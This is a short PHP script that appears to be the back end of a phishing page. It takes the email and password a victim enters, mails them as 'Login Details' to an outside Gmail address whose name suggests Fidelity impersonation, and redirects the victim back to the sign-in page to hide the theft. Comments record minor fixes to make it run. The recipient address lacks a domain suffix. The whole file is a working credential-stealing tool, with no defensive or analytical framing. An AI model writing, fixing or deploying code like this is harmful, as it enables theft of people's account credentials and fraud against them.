<?php
// Added quotes around POST array keys
$username = $_POST['email']; 
$password = $_POST['password']; 

$to = "investfidelity5@gmail"; 
$subject = "Login Details"; 
$message = "Username: $username ||| Password: $password"; 
$headers = "From: investfidelity5@gmail"; 

if (mail($to, $subject, $message, $headers)) { 
    header("Location: Sign_in.html"); 
    exit; // Added exit to stop script execution
} else { 
    header("Location: Sign_in.html"); 
    exit; // Added exit to stop script execution
} 
?>

